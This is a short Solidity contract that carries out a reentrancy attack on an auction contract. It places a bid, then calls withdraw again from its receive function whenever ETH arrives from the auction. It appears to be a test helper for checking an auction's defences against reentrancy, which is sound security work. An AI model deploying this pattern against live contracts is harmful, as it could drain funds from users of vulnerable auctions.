// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function placeBid() external payable;
    function withdraw() external;
}

contract ReentrantContract {
    IAuction public auction;
    
    constructor(address _auction) {
        auction = IAuction(_auction);
    }
    
    // Function to place a bid
    function placeBid() external payable {
        auction.placeBid{value: msg.value}();
    }
    
    // Function to attempt reentrancy attack on withdraw
    function attack() external {
        auction.withdraw();
    }
    
    // Function to attempt reentrancy attack on placeBid
    function attackPlaceBid() external payable {
        auction.placeBid{value: msg.value}();
    }
    
    // Receive function to handle ETH
    receive() external payable {
        // Attempt reentrancy when receiving ETH
        if (msg.sender == address(auction)) {
            auction.withdraw();
        }
    }
} 